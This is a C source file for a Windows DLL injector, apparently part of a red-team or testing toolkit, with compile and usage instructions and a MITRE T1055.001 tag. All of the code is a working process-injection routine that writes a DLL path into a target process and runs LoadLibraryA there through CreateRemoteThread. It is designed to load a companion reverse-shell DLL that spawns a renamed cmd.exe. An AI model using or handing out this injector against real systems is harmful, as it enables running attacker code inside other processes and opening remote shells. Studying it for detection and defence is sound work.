/*
 * DLL Injection v2 — identifiable child in Task Manager
 *
 * Difference from dll_injection.c:
 *   v1 loads whatever DLL you point at. v2 ships a thin injector that
 *   expects the DLL to do the rename + FileDescription patch itself.
 *   The reference DLL is `payload/proc-injection-2/revshell_pure_dll.dll`
 *   which copies cmd.exe next to the host EXE, patches its FileDescription
 *   to "RevShell - WinCmd Proc", then spawns the renamed copy.
 *
 * This file is the INJECTOR. The DLL carries the identifier logic.
 * The split keeps injection + payload cleanly separated (what C2 frameworks
 * do: injector is small, payload is a reusable DLL).
 *
 * MITRE ATT&CK: T1055.001
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -o dll_inject_v2.exe dll_injection_v2.c -lpsapi
 *   cl dll_injection_v2.c /Fe:dll_inject_v2.exe psapi.lib
 *
 * Usage:
 *   dll_inject_v2.exe <PID> <absolute DLL path>
 *
 * Example (uses the reference identifier-aware DLL):
 *   dll_inject_v2.exe 1234 C:\PayloadEverything\thick-client\payload\proc-injection-2\revshell_pure_dll.dll
 *
 * The child under the host will show:
 *     RevShell - WinCmd Proc   <-- big text (patched by the DLL)
 *     revShell.exe             <-- image name (renamed by the DLL)
 */

#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "psapi.lib")

static BOOL verify_dll_loaded(HANDLE hProc, const char* dllName) {
    HMODULE mods[1024];
    DWORD needed = 0;
    if (!EnumProcessModulesEx(hProc, mods, sizeof(mods), &needed, LIST_MODULES_ALL))
        return FALSE;
    char nameBuf[MAX_PATH];
    DWORD count = needed / sizeof(HMODULE);
    for (DWORD i = 0; i < count; ++i) {
        if (GetModuleBaseNameA(hProc, mods[i], nameBuf, sizeof(nameBuf)) > 0) {
            if (_stricmp(nameBuf, dllName) == 0) return TRUE;
        }
    }
    return FALSE;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("Usage: %s <PID> <absolute DLL path>\n", argv[0]);
        printf("\nFor identifiable child in Task Manager, use the DLL at:\n");
        printf("  payload/proc-injection-2/revshell_pure_dll.dll\n");
        return 1;
    }
    DWORD pid = atoi(argv[1]);
    const char* dllPath = argv[2];
    size_t len = strlen(dllPath) + 1;

    if (GetFileAttributesA(dllPath) == INVALID_FILE_ATTRIBUTES) {
        printf("[-] DLL not found: %s\n", dllPath); return 1;
    }

    const char* name = strrchr(dllPath, '\\');
    name = name ? name + 1 : dllPath;

    printf("[+] Target PID : %lu\n", pid);
    printf("[+] DLL        : %s\n", dllPath);
    printf("[*] NOTE: identifier logic lives IN the DLL (rename cmd.exe +\n");
    printf("          patch FileDescription + spawn renamed copy)\n");

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) { printf("[-] OpenProcess (%lu)\n", GetLastError()); return 1; }

    LPVOID buf = VirtualAllocEx(hProc, NULL, len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    SIZE_T w = 0;
    WriteProcessMemory(hProc, buf, dllPath, len, &w);
    printf("[+] Wrote DLL path to %p\n", buf);

    FARPROC loadLibraryA = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    HANDLE hT = CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)loadLibraryA, buf, 0, NULL);
    if (!hT) { printf("[-] CreateRemoteThread (%lu)\n", GetLastError()); return 1; }
    WaitForSingleObject(hT, 10000);
    printf("[+] CreateRemoteThread completed\n");

    if (verify_dll_loaded(hProc, name)) {
        printf("[+] %s loaded in target.\n", name);
        printf("[+] Watch Task Manager under the host for the renamed child.\n");
    } else {
        printf("[-] %s NOT in target's module list (load failed).\n", name);
    }

    VirtualFreeEx(hProc, buf, 0, MEM_RELEASE);
    CloseHandle(hT);
    CloseHandle(hProc);
    return 0;
}
